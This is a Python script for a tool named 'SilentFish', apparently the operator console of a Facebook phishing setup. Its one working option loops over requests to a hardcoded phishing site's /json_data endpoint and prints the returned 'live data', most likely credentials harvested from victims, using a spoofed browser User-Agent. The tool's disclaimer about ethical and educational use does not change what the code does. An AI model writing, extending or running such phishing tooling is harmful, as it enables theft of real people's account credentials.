from colorama import Fore, Style
import os
import time
import requests

# Constants
PHISHING_URL = "https://najafali14.pythonanywhere.com"
TOOL_NAME = "SilentFish"
DEVELOPER_INFO = "Developed by: Yamman Butt"

# Clean and Clear ASCII Art Logo
SILENTFISH_LOGO = f"""
{Fore.CYAN}
#     _____  _  _               _    ______  _       _     
#    / ____|(_)| |             | |  |  ____|(_)     | |    
#   | (___   _ | |  ___  _ __  | |_ | |__    _  ___ | |__  
#    \___ \ | || | / _ \| '_ \ | __||  __|  | |/ __|| '_ \ 
#    ____) || || ||  __/| | | || |_ | |     | |\__ \| | | |
#   |_____/ |_||_| \___||_| |_| \__||_|     |_||___/|_| |_|
{Style.RESET_ALL}
"""

# Disclaimer
DISCLAIMER = f"""
{Fore.YELLOW}This tool is designed for ethical and educational purposes only. 
Unauthorized use of this tool for malicious activities is strictly prohibited 
and may result in legal consequences. Use responsibly.{Style.RESET_ALL}
"""

# Styled Banner
def show_banner():
    """Displays the tool banner."""
    os.system("clear")
    print(SILENTFISH_LOGO)
    print(Style.BRIGHT + Fore.GREEN + "=" * 70)
    print(Fore.GREEN + f"                    Welcome to {TOOL_NAME} v1.0\n                    {DEVELOPER_INFO}")
    print(Fore.GREEN + "=" * 70 + Style.RESET_ALL)

# Styled Disclaimer
def show_disclaimer():
    """Displays the tool disclaimer."""
    print(DISCLAIMER)

# Menu Display
def show_menu():
    """Displays the main menu."""
    print(Style.BRIGHT + Fore.GREEN + "\n[ MAIN MENU ]" + Style.RESET_ALL)
    print(Fore.MAGENTA + "1. Facebook")
    print("2. Exit" + Style.RESET_ALL)

# Polling Functionality for Live Data
def start_polling():
    """live data from testers."""
    print(Fore.YELLOW + f"\nURL: {PHISHING_URL}" + Style.RESET_ALL)
    print(Fore.YELLOW + "\nFetching live data... Press Ctrl+C to stop." + Style.RESET_ALL)
    
    try:
        while True:
            # Fetch live data from the endpoint
            headers = {"User-Agent": "Mozilla/5.0"}
            response = requests.get(f"{PHISHING_URL}/json_data", headers=headers)
            
            # Handle API response
            if response.status_code == 200:
                try:
                    data = response.json()
                    print(Fore.GREEN + f"Received Data: {data}" + Style.RESET_ALL)
                except ValueError:
                    print(Fore.RED + "Error: Received invalid JSON response." + Style.RESET_ALL)
            else:
                print(Fore.RED + f"Failed to fetch data. HTTP Status: {response.status_code}" + Style.RESET_ALL)
            
            # Wait 5 seconds before polling again
            time.sleep(10)
    except KeyboardInterrupt:
        print(Fore.GREEN + "\nStopped. Returning to the main menu." + Style.RESET_ALL)

# Exit Program
def exit_tool():
    """Exits the tool."""
    print(Fore.GREEN + "\nExiting the tool. Stay safe and ethical!" + Style.RESET_ALL)
    time.sleep(1)
    os.system("clear")
    exit()

# Main Function
def main():
    """Main entry point of the tool."""
    show_banner()
    show_disclaimer()

    while True:
        show_menu()
        choice = input(Fore.CYAN + "\nEnter your choice: " + Style.RESET_ALL)
        if choice == "1":
            start_polling()
        elif choice == "2":
            exit_tool()
        else:
            print(Fore.RED + "Invalid choice. Please try again!" + Style.RESET_ALL)

if __name__ == "__main__":
    main()
